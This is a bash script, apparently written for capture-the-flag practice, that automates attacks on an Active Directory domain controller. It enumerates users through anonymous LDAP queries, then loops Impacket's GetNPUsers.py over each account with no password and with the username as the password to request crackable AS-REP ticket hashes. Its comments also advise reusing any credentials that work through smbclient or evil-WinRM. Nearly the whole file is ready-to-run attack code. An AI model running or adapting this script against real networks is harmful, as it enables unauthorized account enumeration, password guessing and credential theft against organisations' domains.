#!/bin/bash

#Created by @Rainsec, follow on Twitter :D

# MUST READ!!!!!!!!!!!

	# If you have a custom wordlist of users you've found, rename  this file names.txt in the CURRENT WORKING DIRECTORY
	# If you do not have a custom wordlist of known users, this script will dump users from LDAP database and proceed
	# This script does not stop once a TGT ticket has been found, so you will have to manually stop the script or let it run
	# Ctrl + C will end the script for those who are unaware :)
	
	# Also, this will display a lot of fast paced output so it invovles some eyeballing unless you wish to let it run and scroll back and
	# read. 
	# If a TGT ticket has not been returned, look for other responses, it does not necessarily mean these creds looping didn't work
	# `No entries found!` Can also mean the creds worked but no TGT could be retrieved. If this is the case, take note of the 
	# user:pass combo (no pass or user:user combination) and try these same creds on smbclient or evilWinRM 

	#If this script fails, then perhaps you're missing a password somewhere on the CTF or a crucial username elsewhere



echo "====== Looping All Users for kerberoast  ====== "


sleep 2

echo "Enter the target IP address"

read target

echo "============"

echo "Specify the FULL path of your Impacket toolkit without / at the end"

read toolkit
echo "============"



ldapsearch -x -h $target -s base | grep DC= > base.txt;

ldapsearch -x -h $target  -s base | grep namingContexts | grep -v CN | grep -v DomainDnsZones | grep -v ForestDnsZones | cut -d ':' -f2 | cut -d '=' -f 2 | cut -d ',' -f1  > domain.txt



	domain=`cat domain.txt`
	




cat base.txt | grep -i namingcontexts > base2.txt; 

cat base2.txt | cut -d ':' -f2 | grep -v CN | grep -v DomainDnsZones | grep -v ForestDnsZones > dc.txt;

value=`cat dc.txt`


echo "Found DC name..."
echo "============"
echo $value

echo "============"

sleep 1

echo " "

file=names.txt

if  test -f $file ;
then

echo "Found  names.txt, looping for kerberoast now "
echo "============"
echo " "

else
echo "------- names.txt not found - Let script proceed"
fi

echo " Trying NO password to kerberoast "
sleep 2

if  test -f $file ;
then

	for i in `cat names.txt`; do


         python $toolkit/GetNPUsers.py $domain.local/$i -no-pass  -dc-ip $target -request
	done
fi


sleep 1

echo " Trying username as password to kerberoast "
sleep 3



if test -f $file;
then


	for i in `cat names.txt`; do

	python $toolkit/GetNPUsers.py $domain.local/$i:$i  -dc-ip $target -request
	done

fi


ldapsearch -x -h $target -b $value | grep -i samaccountname | cut -d ':' -f2  > names.txt 

sleep 2

echo "Generated names.txt, looping for kerberoast now "
echo "============"
echo " "

echo " Trying NO password to kerberoast "
sleep 3



for i in `cat names.txt`; do




python $toolkit/GetNPUsers.py $domain.local/$i -no-pass  -dc-ip $target -request
done

sleep 2

echo " Trying username as password to kerberoast "
sleep 3

for i in `cat names.txt`; do

python $toolkit/GetNPUsers.py $domain.local/$i:$i  -dc-ip $target -request
done

echo "====== DONE :)  ===== "
